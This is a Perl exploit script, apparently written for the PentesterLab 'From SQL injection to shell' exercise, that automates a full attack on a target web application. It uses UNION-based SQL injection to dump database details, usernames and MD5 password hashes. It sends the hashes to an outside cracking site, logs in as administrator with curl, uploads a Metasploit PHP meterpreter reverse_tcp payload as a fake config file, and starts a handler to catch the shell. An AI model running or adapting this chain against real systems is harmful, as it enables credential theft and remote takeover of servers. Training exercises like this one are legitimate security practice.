#!/usr/bin/perl
use LWP::UserAgent;

# -----------------------------------------------------------------------------------
#  Automated Sqli2Shell Exploit.
#  "From SQL injection to shell" exercise - https://www.pentesterlab.com
# ---------------------------------------------------------------------------------
#  mr.pr0n - http://ghostinthelab.wordpress.com - (@_pr0n_)
# ---------------------------------------------------------------------------------

print "\n+--------------------------------------------+\n";
print "|  'From SQL injection to shell' exercise    |\n";
print "|    http://ghostinthelab.wordpress.com      | \n";
print "+--------------------------------------------+\n";

print "\nEnter the address of the target box";
print "\n> ";
$target=<STDIN>;
chomp($target);
$target = "http://".$target if ($target !~ /^http:/);

#-----------------------------------------------------------------------------------------------------
$count 	   = "count(*)";				# Check the number of registered users.
$pwn_users = "login,0x3a,password";			# Get Usernames and passwords of registered users.
$db_info   = "database(),0x3a,version(),0x3a,user()";   # Get database information.
#-----------------------------------------------------------------------------------------------------

print "\n[+] Checking if the target is vulenerable... \n";
$sqli = "/cat.php?id=0 UNION SELECT 1,CONCAT(0x21,".$count.",0x21),3,4 FROM users";
$int = LWP::UserAgent->new() or die;
$check=$int->get($target.$sqli);
if ($check->content =~ m/!(.*)!/g)
{
   print "    [*] Target, seem to be vulnerable! \n";
   print "[+] Yaw, lets Rock! \n";

   print "\n[+] Exporting Database information... \n";
   sleep(3);

   $sqli = "/cat.php?id=0 UNION SELECT 1,CONCAT(0x21,".$db_info.",0x21),3,4 FROM users";
   $int = LWP::UserAgent->new() or die;
   $check=$int->get($target.$sqli);
   if ($check->content =~ m/!(.*):(.*):(.*)!/g)
   {
      ($db_name) = $1;
      ($db_vers) = $2;
      ($db_user) = $3;

      print "    [*] Database Name      : "."\e[1;33m$db_name\e[0m\n";
      print "    [*] Database Vesion    : "."\e[1;33m$db_vers\e[0m\n";
      print "    [*] Database User      : "."\e[1;33m$db_user\e[0m\n";
   }
   else
   {
     print "[-] Exporting Database information - FAILED!.\n";
   }
   $sqli = "/cat.php?id=0 UNION SELECT 1,CONCAT(0x21,".$count.",0x21),3,4 FROM users";
   $int = LWP::UserAgent->new() or die;
   $check=$int->get($target.$sqli);
   print "\n[+] Checking for usernames / passwords.. \n";
   if ($check->content =~ m/!(.*)!/g)
   {
      ($users) = $1;
      print "[+] Found $users users on target!\n\n";
      print "[+] Pwning '$db_name' database...\n";
      for ($i=1; $i <= $users; $i++)       
      {          
         $sqli = "/cat.php?id=0 UNION SELECT 1,CONCAT(0x21,".$pwn_users.",0x21),3,4 FROM users WHERE id=".$i."";          
         print "    [*] User with id=".$i.":\n";          
         $int = LWP::UserAgent->new() or die;
         $check=$int->get($target.$sqli);
         if ($check->content =~ m/!(.*):(.*)!/g)
         {
            ($username)	= $1;
            ($hash)    	= $2;

            print "    [*] Username   : \e[1;32m$username\e[0m \n";
            $url = 'http://www.md5-hash.com/md5-hashing-decrypt/';
            $int = LWP::UserAgent->new() or die;
            $check=$int->get($url.$hash);
            if ($check->content =~ m/<strong class="result">(.*)<\/strong>/g)
            {
               print "    [*] Password   : \e[1;32m$1\e[0m (MD5Hash: $hash)\n\n";
            }
            else
            {
               print "    [-] Password   : \e[1;31mPASSWORD NOT FOUND\e[0m (MD5Hash: $hash)\n\n";
            }
         }
      }
    }
    print "\n[+] Checking for administrator account... \n";
    $sqli = "/cat.php?id=0 UNION SELECT 1,CONCAT(0x21,".$pwn_users.",0x21),3,4 FROM users WHERE id =1";
    $int = LWP::UserAgent->new() or die;
    $check=$int->get($target.$sqli);
    if ($check->content =~ m/!(.*):(.*)!/g)
    {
       ($username)	= $1;
       ($hash)    	= $2;

       print "    [*] Username   : \e[1;32m$username\e[0m \n";
       $url = 'http://www.md5-hash.com/md5-hashing-decrypt/';
       $int = LWP::UserAgent->new() or die;
       $check=$int->get($url.$hash);
       if ($check->content =~ m/<strong class="result">(.*)<\/strong>/g)
       {
          print "    [*] Password   : \e[1;32m$1\e[0m \n\n";
          print "[+] Retrieving cookie..\n";
          system('curl -b cookies.txt -c cookies.txt -d "user='.$username.'&password='.$1.'&submit=Login" '.$target.'/admin/new.php >/dev/null 2>&1');

          # The IP address for the reverse connection
          print "\nEnter the IP address for the reverse connection (e.g.: 192.168.178.27)";
          print "\n> ";
          $ip=<STDIN>;
          chomp($ip);

          # The port to connect back
          print "\nEnter the port to connect back on (e.g.: 4444)";
          print "\n> ";
          $port=<STDIN>;
          chomp($port);

          $filename = "config_".int(rand()*1011).".php3";

          print "\n[+] Creating shell (using MSF)..";
          system("msfpayload php/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R >> $filename");
          sleep(5);

          print "\n[+] Uploading shell..";
          system('curl -b cookies.txt -c cookies.txt -F title="gotpwn" -F image=@'.$filename.' -F category="1" -F "Submit=Add" '.$target.'/admin/index.php >/dev/null 2>&1');

	  print "\n[+] Executing the msfcli..";
	  $msfcli = "msfcli multi/handler PAYLOAD=php/meterpreter/reverse_tcp LHOST=$ip LPORT=$port E";
	  system("xterm -e $msfcli &");;
          sleep(60);

          $int = LWP::UserAgent->new() or die;
          print "\n[+] Got meterpreter shell ..?\n";
          $check=$int->get($target."/admin/uploads/"."$filename ");
       }
       else
       {
          print "[-] Password *NOT* FOUND!\n\n";
       }
    }
    else
    {
       print "[-] Administrator account *NOT* Found!! \n";
    }
}
